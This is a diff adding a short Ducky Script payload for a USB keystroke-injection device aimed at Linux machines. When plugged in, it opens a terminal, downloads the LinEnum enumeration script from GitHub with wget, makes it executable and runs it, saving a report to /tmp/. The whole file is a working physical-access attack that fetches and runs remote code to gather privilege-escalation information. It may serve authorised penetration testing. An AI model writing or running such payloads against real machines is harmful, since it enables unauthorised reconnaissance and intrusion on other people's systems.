@@ -1,0 +1,16 @@
+REM FalsePhilosopher
+REM WIP
+REM Target linux
+DELAY 300
+CTRL-ALT+t
+DELAY 1000
+STRING wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+DELAY 300
+ENTER
+STRING chmod +x LinEnum.sh
+DELAY 300
+ENTER
+DELAY 300
+STRING ./LinEnum.sh -r report -e /tmp/
+DELAY 300
+ENTER
